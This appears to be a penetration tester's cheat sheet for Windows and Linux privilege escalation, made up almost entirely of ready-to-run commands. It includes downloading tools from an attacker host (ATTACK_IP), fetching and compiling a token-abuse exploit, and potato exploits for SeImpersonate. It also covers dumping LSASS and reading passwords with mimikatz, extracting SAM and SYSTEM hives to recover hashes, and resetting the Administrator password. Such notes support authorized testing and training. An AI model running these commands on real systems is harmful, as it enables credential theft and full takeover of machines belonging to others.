# Privilege Escalation
## Windows

### Checklist
- Check username and hostname
- Check for Powershell history file
- Network Information
- Existing users and groups
- Operating system information
- Installed applications
- Running Services
- Scheduled Tasks
- Check for AlwaysInstallElevated
- Configuration and sensitive files
- Check for DPAPI Credentials in AppData\Roaming
- Run Bloodhound/Sharphound in domain environment
### Enumeration

#### Privilege Enumeration
```Powershell
# Privilege Enumeration
whoami /priv

# Privilege, User Groups and SID enumeration
whoami /all

# Check privileges over a directory or file
icacls "PATH\TO\TARGET"

# Check for AlwaysInstallElevated - Both need to return 1
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Install msi 
msiexec /i /qn /quiet C:\Path\To\File.msi
```

#### User Enumeration
```PowerShell
# Check all local users
net user

# View specific user information
net user <USERNAME>

# Check for user directories
dir C:\Users

# Useful directories to check for files in
dir C:\Users\OWNED_USER\Documents
dir C:\Users\OWNED_USER\Downloads
dir C:\Users\OWNED_USER\Desktop

# Check for users with autologin
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

#### File Enumeration
```PowerShell
# Search for sensitive files
Get-ChildItem -Path C:\ -Include *.txt, *.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Name *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```
#### PowerShell History

```PowerShell
# Find HistorySavePath
(Get-PSReadLineOption).HistorySavePath

# Search PowerShell history directory
dir C:\Users\<USERNAME>\AppData\Roaming\Microsoft\PowerShell\PSReadline\
```

#### Service Enumeration
```Powershell
# Check all running services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# Check Start Type of a service
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

# Check for Unquoted service paths (CMD)
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """

# Query a service
sc.exe query <SERVICE_NAME>

# Check for service start type
sc.exe qc <SERVICE_NAME>
```
##### Service Privilege Check
```PowerShell
# check permissions over a specific service
sc.exe sdshow <SERVICE_NAME>

# Useful groups to check for
AU (Authenticatied Users), BU (BUILTIN USERS), USER SID

# Common rights
RP (Start-Service), WP (Stop-Service), CC (Change-Service-Config)
```
#### Scheduled Tasks
```powershell
# Check for all scheduled tasks
schtasks /query /fo LIST /v
```

#### Program Enumeration
```Powershell
# Check ProgramFiles directories
dir C:\"Program Files"
dir C:\"Program Files (x86)"

# Check for installed applications
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
#### Automated Scanning
```PowerShell
# transfer winPEAS with powershell and execution
iwr -uri http://ATTACK_IP/winPEAS64.exe -Outfile .\winPEAS64.exe
.\winPEAS64.exe

# transfer using certutil
certutil -f -urlcache http://ATTACK_IP/winPEAS64.exe winPEAS64.exe
```

### Privilege Exploitation
#### SeImpersonate
```powershell
# PrintSpoofer.exe
.\PrintSpoofer64.exe -c "CMD"

# SigmaPotato.exe
.\SigmaPotato.exe "CMD"

# JuicyPotato.exe
.\JuicyPotato.exe -l PORT -t * -p <PROGRAM> -c <CLS-ID>
```

#### SeTcbPrivilege
```bash
# Get TcbElevation.cpp
wget https://gist.githubusercontent.com/antonioCoco/19563adef860614b56d010d92e67d178/raw/f044e4be7c59c58968dbae56e586e1400ab35f32/TcbElevation.cpp

# Compile code
x86_64-w64-mingw32-g++ TcbElevation.cpp -o TcbElevation.exe -municode -lntdll -ladvapi32 -lsecur32 -luser32

# Execution
.\TcbElevation.exe <SERVICE_NAME> "CMD"
```

#### SeTakeOwnership Privilege
```powershell
# Take ownership of a file
takeown /f "C:\PATH\TO\FILE"

# Grant full permission over owned file
icacls "C:\PATH\TO\FILE" /grant USER:F
```
#### SeDebugPrivilege
```PowerShell
# ProcDump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# mimikatz
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```
#### SeBackupPrivilege
```powershell
# Save SAM and SYSTEM to current directory
reg save HKLM\SAM SAM.HIVE
reg save HKLM\SYSTEM SYSTEM.HIVE
# dump hives with secretsdump
impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL

# Use SeBackupPrivilege utility
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll
# Copy file
Copy-FileSeBackupPrivilege PATH\TO\FILE PATH\TO\OUTPUTDIRECTORY

# Create shadow copy with diskshadow
diskshadow /s diskshadow_backup.txt

# Using vssadmin
vssadmin create shadow /for=C:
# shadow path should be something like \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
# Use robocopy to copy the SAM file to temp folder
robocopy /B \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\SAM $env:TEMP\SAM.hive

# Backup a directory
robocopy /B /E "PATH\TO\DIRECTORY" "PATH\TO\OUTPUTDIRECTORY"
```

#### SeManageVolumePrivilege
```powershell
# Take ownership of the Windows directory
.\SeManageVolumeExploit.exe

# dll hijack for systeminfo (Network Service - Then proceed with SeImpersonate)
C:\Windows\System32\wbem\tzres.dll 

```

#### SeRestorePrivilege
```powershell
# Import the Invoke-SeRestoreAbuse module
Import-Module ./Invoke-SeRestoreAbuse.ps1

# Usage
Invoke-SeRestoreAbuse -Command "cmd"

#Example - change admin password to Pwned
Invoke-SeRestoreAbuse -Command "net user Administrator Pwned"
```
## Linux

### Checklist
- Username and hostname
- Environment Variables
- Existing users and groups
- System information (Kernel version, Operating system version etc')
- Writable directories and files
- Cronjobs
- Run pspy32/64
- Check for sudo privileges
- Check for SUIDs/GUIDs
- Network information
- Sensitive directories (etc/var/opt for example)
- Check for configuration / sensitive files
- Check for installed applications and related vulnerabilities
- Utilize strings when possible to possibly find passwords/keys from programs
### Enumeration

#### User Enumeration
```bash
# Check User Context
id

# Check System Users
cat /etc/passwd
ls /home/

# Check excessive privileges
sudo -l

# Check for SUIDs/GUIDs
find / -type f -perm -4000 -ls 2>/dev/null | grep -vE "/proc/|/snap/"

# Check for Writable directories
find / -type d -writable -ls 2>/dev/null | grep -vE "/proc/|/snap/"

# Check for Writable files
find / -type f -writable -ls 2>/dev/null | grep -vE "/proc/|/snap/"

# Check environment variables
env
cat ~/.bashrc

# Check for user history file 
cat ~/.bash_history

# Check capabilities
getcap -r / 2>/dev/null
```
#### System Enumeration
```bash
# Hostname
hostname

# IP address
ifconfig
ip addr
hostname -I

# Operating System enumeration
cat /etc/issue
cat /etc/os-release

# Kernel version
uname -a

# Active Network Connections / Listening Ports
ss -tulpn
netstat -antp
```

#### Cronjobs Enumeration
```bash
# Check cron directories
ls /etc/cron*

# Check crontab file
cat /etc/crontab

# Check for user specific cronjobs (useful with sudo)
crontab -l

# Check  cron log file
grep "CRON" /var/log/syslog

# Monitor processes
./pspy64s
```